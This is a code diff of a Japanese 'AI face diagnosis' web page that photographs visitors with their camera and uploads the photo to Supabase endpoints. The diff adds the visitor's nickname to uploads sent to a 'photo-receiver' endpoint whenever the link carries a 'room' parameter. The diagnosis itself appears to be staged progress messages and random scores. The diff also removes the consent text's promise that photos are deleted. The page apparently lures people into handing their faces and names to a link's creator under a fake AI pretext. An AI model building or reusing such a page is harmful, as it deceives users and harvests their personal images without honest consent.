@@ -66,7 +66,6 @@ button {
 
 button:disabled {
   background: #aaa;
-  cursor: not-allowed;
 }
 
 video,
@@ -129,7 +128,6 @@ video,
   height: 100%;
   background: linear-gradient(90deg, #4f46e5, #a855f7);
   border-radius: 20px;
-  transition: width 0.1s linear;
 }
 
 .percent {
@@ -248,6 +246,7 @@ video,
   type="text"
   id="nickname"
   placeholder="名前orニックネーム"
+  maxlength="30"
 >
 
 <div class="consent">
@@ -256,11 +255,11 @@ video,
 
 <p>
 AI顔診断を行うため、カメラで顔写真を撮影します。
-撮影した写真は、診断に必要な処理のためAIが不正チェックを行います。
+撮影した写真は診断に必要な処理のためサーバーへ送信されます。
 </p>
 
 <p>
-写真は診断後に自動削除されます。
+写真は診断・写真受信の目的で使用されます。
 </p>
 
 <label>
@@ -487,25 +486,15 @@ RANK -
 
 <script>
 
-/*
-========================================
-送信先
-========================================
-*/
-
-// 通常のAI診断
 const SMOOTH_WORKER_URL =
   "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/smooth-worker";
 
-// リンク経由の写真受信
 const PHOTO_RECEIVER_URL =
   "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";
 
 
 /*
-========================================
-URLのroomを最初に確定
-========================================
+URLからroomを取得
 */
 
 const urlParams =
@@ -518,9 +507,7 @@ const room =
 
 
 /*
-========================================
 画面
-========================================
 */
 
 const startArea =
@@ -586,9 +573,7 @@ let finalRank = "";
 
 
 /*
-========================================
-同意チェック
-========================================
+同意
 */
 
 consent.addEventListener(
@@ -603,9 +588,7 @@ consent.addEventListener(
 
 
 /*
-========================================
-カメラ開始
-========================================
+カメラ
 */
 
 startButton.addEventListener(
@@ -615,8 +598,10 @@ startButton.addEventListener(
     if (!nickname.value.trim()) {
 
       alert(
-        "ニックネームを入力してください"
+        "名前またはニックネームを入力してください"
       );
+
+      nickname.focus();
 
       return;
     }
@@ -658,14 +643,24 @@ startButton.addEventListener(
 
 
 /*
-========================================
 撮影
-========================================
 */
 
 captureButton.addEventListener(
   "click",
   () => {
+
+    if (
+      !camera.videoWidth ||
+      !camera.videoHeight
+    ) {
+
+      alert(
+        "カメラの準備ができていません。"
+      );
+
+      return;
+    }
 
     const canvas =
       document.createElement("canvas");
@@ -722,8 +717,7 @@ captureButton.addEventListener(
             track.stop()
         );
 
-      cameraStream =
-        null;
+      cameraStream = null;
 
     }
 
@@ -738,22 +732,13 @@ captureButton.addEventListener(
 
 
 /*
-========================================
 写真送信
-========================================
 
-重要：
+ROOMあり
+→ photo-receiverのみ
 
-roomあり
-↓
-photo-receiverだけ
-
-roomなし
-↓
-smooth-workerだけ
-
-この2つを絶対に同時実行しない。
-========================================
+ROOMなし
+→ smooth-workerのみ
 */
 
 sendButton.addEventListener(
@@ -764,6 +749,18 @@ sendButton.addEventListener(
 
       alert(
         "写真がありません"
+      );
+
+      return;
+    }
+
+    const name =
+      nickname.value.trim();
+
+    if (!name) {
+
+      alert(
+        "名前またはニックネームを入力してください"
       );
 
       return;
@@ -782,22 +779,18 @@ sendButton.addEventListener(
 
 
       /*
-      --------------------------------
-      ROOM付きURL
-      --------------------------------
+      ROOMあり
       */
 
       if (room) {
 
-        /*
-        room付きの場合は
-        photo-receiverにしか送信しない。
-        */
-
         const receiverUrl =
           PHOTO_RECEIVER_URL +
           "?room=" +
-          encodeURIComponent(room);
+          encodeURIComponent(room) +
+          "&nickname=" +
+          encodeURIComponent(name);
+
 
         response =
           await fetch(
@@ -818,17 +811,10 @@ sendButton.addEventListener(
 
 
       /*
-      --------------------------------
-      ROOMなしURL
-      --------------------------------
+      ROOMなし
       */
 
       else {
-
-        /*
-        roomなしの場合だけ
-        smooth-workerを使用する。
-        */
 
         response =
           await fetch(
@@ -848,27 +834,15 @@ sendButton.addEventListener(
       }
 
 
-      /*
-      --------------------------------
-      送信結果チェック
-      --------------------------------
-      */
-
       if (!response.ok) {
 
         throw new Error(
-          "写真の送信に失敗しました。HTTP " +
+          "HTTP " +
           response.status
         );
 
       }
 
-
-      /*
-      --------------------------------
-      送信成功
-      --------------------------------
-      */
 
       resultArea.style.display =
         "none";
@@ -886,7 +860,7 @@ sendButton.addEventListener(
     } catch (error) {
 
       console.error(
-        "写真送信エラー:",
+        "送信エラー:",
         error
       );
 
@@ -907,9 +881,7 @@ sendButton.addEventListener(
 
 
 /*
-========================================
 再撮影
-========================================
 */
 
 retakeButton.addEventListener(
@@ -953,9 +925,7 @@ retakeButton.addEventListener(
 
 
 /*
-========================================
 解析演出
-========================================
 */
 
 function startDiagnosis() {
@@ -976,19 +946,12 @@ function startDiagnosis() {
   const steps = [
 
     "診断処理を開始しています…",
-
     "画像情報を確認しています…",
-
     "表情の特徴を確認しています…",
-
     "雰囲気の特徴を確認しています…",
-
     "写真映えの特徴を確認しています…",
-
     "各項目のスコアを計算しています…",
-
     "診断結果を生成しています…",
-
     "最終チェックを行っています…"
 
   ];
@@ -1002,7 +965,6 @@ function startDiagnosis() {
       () => {
 
         percent += 1;
-
 
         analysisProgress.style.width =
           percent + "%";
@@ -1031,7 +993,6 @@ function startDiagnosis() {
 
           clearInterval(timer);
 
-
           setTimeout(
             createDiagnosis,
             500
@@ -1047,9 +1008,7 @@ function startDiagnosis() {
 
 
 /*
-========================================
 診断結果
-========================================
 */
 
 function createDiagnosis() {
@@ -1094,10 +1053,6 @@ function createDiagnosis() {
     " さんの診断結果";
 
 
-  /*
-  数字アニメーション
-  */
-
   animateNumber(
     "totalScore",
     total,
@@ -1122,10 +1077,6 @@ function createDiagnosis() {
     1200
   );
 
-
-  /*
-  ランク
-  */
 
   let rank;
 
@@ -1167,20 +1118,12 @@ function createDiagnosis() {
     "RANK " + rank;
 
 
-  /*
-  コメント
-  */
-
   const comments = [
 
     "自然な表情が魅力的で、親しみやすい印象があります。",
-
     "全体的にバランスの取れた雰囲気で、写真との相性が良いタイプです。",
-
     "明るい雰囲気が感じられ、表情による魅力が出やすいタイプです。",
-
     "落ち着いた印象と独特の雰囲気が特徴的です。",
-
     "写真にしたときに印象が残りやすいタイプです。"
 
   ];
@@ -1201,10 +1144,6 @@ function createDiagnosis() {
     "block";
 
 
-  /*
-  ゲージ
-  */
-
   setTimeout(
     () => {
 
@@ -1213,12 +1152,10 @@ function createDiagnosis() {
       ).style.width =
         expression + "%";
 
-
       document.getElementById(
         "moodBar"
       ).style.width =
         mood + "%";
-
 
       document.getElementById(
         "photoBar"
@@ -1233,9 +1170,7 @@ function createDiagnosis() {
 
 
 /*
-========================================
 シェア
-========================================
 */
 
 shareButton.addEventListener(
@@ -1266,9 +1201,7 @@ shareButton.addEventListener(
 
     try {
 
-      if (
-        navigator.share
-      ) {
+      if (navigator.share) {
 
         await navigator.share({
 
@@ -1315,9 +1248,7 @@ shareButton.addEventListener(
 
 
 /*
-========================================
 数字アニメーション
-========================================
 */
 
 function animateNumber(
@@ -1331,7 +1262,6 @@ function animateNumber(
       elementId
     );
 
-
   const startTime =
     performance.now();
 
@@ -1344,19 +1274,16 @@ function animateNumber(
       currentTime -
       startTime;
 
-
     const progress =
       Math.min(
         elapsed / duration,
         1
       );
 
-
     const value =
       Math.floor(
         target * progress
       );
-
 
     element.textContent =
       value;
@@ -1386,9 +1313,7 @@ function animateNumber(
 
 
 /*
-========================================
 スコア
-========================================
 */
 
 function randomScore() {
